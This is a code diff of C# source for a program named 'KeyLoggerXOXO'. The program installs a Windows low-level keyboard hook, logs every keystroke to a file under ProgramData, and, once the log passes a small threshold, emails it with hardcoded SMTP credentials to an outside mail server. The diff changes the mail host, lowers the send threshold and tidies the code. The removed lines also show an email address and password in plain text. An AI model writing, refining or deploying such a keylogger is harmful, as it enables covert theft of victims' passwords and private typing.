@@ -5,20 +5,19 @@ using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-using static System.Net.Mime.MediaTypeNames;
 
 namespace KeyLoggerXOXO
 {
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "dontlogintome";
-        private const string TO_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
+        private const string FROM_EMAIL_ADDRESS = "*******************";
+        private const string FROM_EMAIL_PASSWORD = @"****************";
+        private const string TO_EMAIL_ADDRESS = "********************";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
-        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
+        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 10;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
         // ----------------------------- END -------------------------------- //
 
@@ -31,25 +30,23 @@ namespace KeyLoggerXOXO
         static void Main(string[] args)
         {
             hook = SetHook(llkProcedure);
-            System.Windows.Forms.Application.Run();
+            Application.Run();
             UnhookWindowsHookEx(hook);
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-
             if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
             {
-                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
-                output.Write(buffer);
-                output.Close();
+                using (StreamWriter output = new StreamWriter(LOG_FILE_NAME, true))
+                {
+                    output.Write(buffer);
+                }
                 buffer = "";
             }
 
-            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");
-
+            FileInfo logFile = new FileInfo(LOG_FILE_NAME);
             // Archive and email the log file if the max size has been reached
             if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
             {
@@ -57,12 +54,10 @@ namespace KeyLoggerXOXO
                 {
                     // Copy the log file to the archive
                     logFile.CopyTo(ARCHIVE_FILE_NAME, true);
-
                     // Delete the log file
                     logFile.Delete();
-
                     // Email the archive and send email using a new thread
-                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
+                    System.Threading.Thread mailThread = new System.Threading.Thread(sendMail);
                     Console.Out.WriteLine("\n\n**MAILSENDING**\n");
                     mailThread.Start();
                 }
@@ -96,7 +91,6 @@ namespace KeyLoggerXOXO
                     buffer += (Keys)vkCode;
                 }
             }
-
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
@@ -105,12 +99,13 @@ namespace KeyLoggerXOXO
             try
             {
                 // Read the archive file contents into the email body variable
-                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
-                string emailBody = input.ReadToEnd();
-                input.Close();
-
+                string emailBody;
+                using (StreamReader input = new StreamReader(ARCHIVE_FILE_NAME))
+                {
+                    emailBody = input.ReadToEnd();
+                }
                 // Create the email client object
-                SmtpClient client = new SmtpClient("smtp.gmail.com")
+                SmtpClient client = new SmtpClient("smtp.zoho.eu")
                 {
                     Port = 587,
                     DeliveryMethod = SmtpDeliveryMethod.Network,
@@ -118,7 +113,6 @@ namespace KeyLoggerXOXO
                     Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                     EnableSsl = true,
                 };
-
                 // Build the email message
                 MailMessage message = new MailMessage
                 {
@@ -127,20 +121,16 @@ namespace KeyLoggerXOXO
                     Body = emailBody,
                     IsBodyHtml = false,
                 };
-
                 if (INCLUDE_LOG_AS_ATTACHMENT)
                 {
-                    Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
+                    Attachment attachment = new Attachment(ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain);
                     message.Attachments.Add(attachment);
                 }
-
                 // Set the recipient
                 message.To.Add(TO_EMAIL_ADDRESS);
-
                 // Send the message
                 client.Send(message);
-
-                // Release resources used by the msssage (archive file)
+                // Release resources used by the message (archive file)
                 message.Dispose();
             }
             catch (Exception e)
